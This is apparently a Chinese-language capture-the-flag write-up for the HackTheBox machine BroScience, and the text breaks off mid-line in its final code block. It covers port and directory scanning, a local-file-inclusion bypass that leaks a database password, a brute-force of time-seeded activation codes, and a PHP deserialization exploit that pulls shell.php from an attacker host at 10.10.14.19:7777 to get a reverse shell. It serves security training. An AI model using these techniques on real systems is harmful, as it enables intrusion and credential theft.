---
title: BroScience - HackTheBox
url: https://darkwing.moe/2023/01/09/BroScience-HackTheBox/
source: 喵喵喵喵
date: 2023-01-10
fetch_date: 2025-10-04T03:22:42.646556
---

# BroScience - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

BroScience - HackTheBox

# BroScience - HackTheBox

##### 2023-01-09

#### TOC

1. [1. 基本信息](#基本信息)
   1. [1.1. 10.10.11.195](#10-10-11-195)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80/443](#80-443)
3. [3. 目录扫描](#目录扫描)
   1. [3.1. img.php](#img-php)
4. [4. LFI](#LFI)
   1. [4.1. db\_connect.php](#db-connect-php)
   2. [4.2. register.php](#register-php)
   3. [4.3. utils.php](#utils-php)
5. [5. 伪随机数](#伪随机数)
   1. [5.1. activate.php](#activate-php)
6. [6. PHP 反序列化](#PHP-反序列化)
   1. [6.1. 反序列化 getshell](#反序列化-getshell)
   2. [6.2. reverse shell](#reverse-shell)
   3. [6.3. exploit.php](#exploit-php)
7. [7. 信息](#信息)
   1. [7.1. hash crack](#hash-crack)
8. [8. user flag](#user-flag)
9. [9. 提权信息](#提权信息)
   1. [9.1. /opt/renew\_cert.sh](#opt-renew-cert-sh)
10. [10. 提权 & root flag](#提权-amp-root-flag)
    1. [10.1. shadow](#shadow)
11. [11. 参考资料](#参考资料)

# BroScience - HackTheBox

2023-01-09

# 基本信息

* <https://www.hackthebox.com/home/machines/profile/521>
* ## 10.10.11.195

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010901.jpg)

# 端口扫描

22,80,443:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.195 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 14:40 CST Nmap scan report for 10.10.11.195 Host is up (0.19s latency). Not shown: 997 closed tcp ports (conn-refused) PORT    STATE SERVICE  VERSION 22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: |   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA) |   256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA) |_  256 3c6575274ae2ef9391374cfdd9d46341 (ED25519) 80/tcp  open  http     Apache httpd 2.4.54 |_http-title: Did not follow redirect to https://broscience.htb/ |_http-server-header: Apache/2.4.54 (Debian) 443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian)) | http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT | Not valid before: 2022-07-14T19:48:36 |_Not valid after:  2023-07-14T19:48:36 |_http-server-header: Apache/2.4.54 (Debian) |_http-title: BroScience : Home | tls-alpn: |_  http/1.1 Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 73.45 seconds ``` |

## 80/443

需要加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.195 broscience.htb ``` |

健身相关的：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010902.jpg)

# 目录扫描

扫描发现includes，进一步发现img.php:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ``` | ``` gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u https://broscience.htb/ -k -x php,html,txt  /activate.php         (Status: 200) [Size: 1256] /comment.php          (Status: 302) [Size: 13] [--> /login.php] /images               (Status: 301) [Size: 319] [--> https://broscience.htb/images/] /includes             (Status: 301) [Size: 321] [--> https://broscience.htb/includes/] /index.php            (Status: 200) [Size: 9308] /javascript           (Status: 301) [Size: 323] [--> https://broscience.htb/javascript/] /login.php            (Status: 200) [Size: 1936] /logout.php           (Status: 302) [Size: 0] [--> /index.php] /manual               (Status: 301) [Size: 319] [--> https://broscience.htb/manual/] /register.php         (Status: 200) [Size: 2161] /styles               (Status: 301) [Size: 319] [--> https://broscience.htb/styles/] /user.php             (Status: 200) [Size: 1309]  gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u https://broscience.htb/includes/ -k -x php,html,txt  /db_connect.php       (Status: 200) [Size: 0] /header.php           (Status: 200) [Size: 369] /img.php              (Status: 200) [Size: 39] /utils.php            (Status: 200) [Size: 0] ``` |

## img.php

直接访问提示缺少path参数：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010903.jpg)

# LFI

根据path参数，很容易想到LFI，但存在检测：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010904.jpg)

简单地绕过，两次URL编码即可：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010905.jpg)

后面就是LFI读文件：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` $db_host = "localhost"; $db_port = "5432"; $db_name = "broscience"; $db_user = "dbuser"; $db_pass = "RangeOfMotion%777"; $db_salt = "NaCl";  $activation_link = "https://broscience.htb/activate.php?code={$activation_code}"; ``` |

## db\_connect.php

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010906.jpg)

## register.php

代码显示发送激活链接功能还没做：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010907.jpg)

## utils.php

根据代码，生成激活码的随机数种子和时间相关：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010908.jpg)

# 伪随机数

所以我们可以自己根据时间生成激活码，一般前后500ms范围内时间作为种子即可

首先注册一个账号，得到服务端的响应时间：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010909.jpg)

然后根据时间作为随机数种子爆破出有效激活码：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` php activate.php > codes.txt  ffuf -w ./codes.txt:FUZZ -u "https://broscience.htb/activate.php?code=FUZZ"  -fs 125  qdJkKQPQa5JeVIzP9JM1PFe3vRGFa3cO [Status: 200, Size: 1251, Words: 292, Lines: 28, Duration: 689ms] ``` |

现在，我们注册的账号已经激活，可以登录：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010910.jpg)

## activate.php

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ``` | ``` <?php function generate_activation_code($time) {     $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";     srand($time);     $activation_code = "";     for ($i = 0; $i < 32; $i++) {         $activation_code = $activation_code . $chars[rand(0,  strlen($chars) - 1)];     }     return $activation_code; } // find this from the above server response time $ref_time = date("U",strtotime('Mon, 09 Jan 2023 07:08:32 GMT')); for ($t = $ref_time - 500; $t <= $ref_time + 500; $t++)     echo generate_activation_code($t)."\n"; ?> ``` |

# PHP 反序列化

查看cookie发现是序列化数据，根据前面utils中的代码存在反序列化操作：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010911.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010912.jpg)

## 反序列化 getshell

根据代码，`get_theme`读取 cookie 并反序列化它，`Avatar`读取文件并保存到本地。因此，我们可以利用这些让目标从我们这里读取 shell 脚本，然后触发目标上的 shell。

|  |  |
| --- | --- |
| ``` 1 ``` | ``` php exploit.php ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010913.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010914.jpg)

## reverse shell

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010915.jpg)

## exploit.php

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 ``` | ``` <?php class Avatar {     public $imgPath;      public function __construct($imgPath) {         $this->imgPath = $imgPath;     }      public function save($tmp) {         $f = fopen($this->imgPath, "w");         fwrite($f, file_get_contents($tmp));         fclose($f);     } }  class AvatarInterface {     public $tmp = "http://10.10.14.19:7777/shell.php";     public $imgPath = "./shell.php";      public function __wakeup() {         $a = new Avatar($this->imgPath);         $a->save($this->tmp);     } }  echo base64_encode(serialize(new AvatarInterf...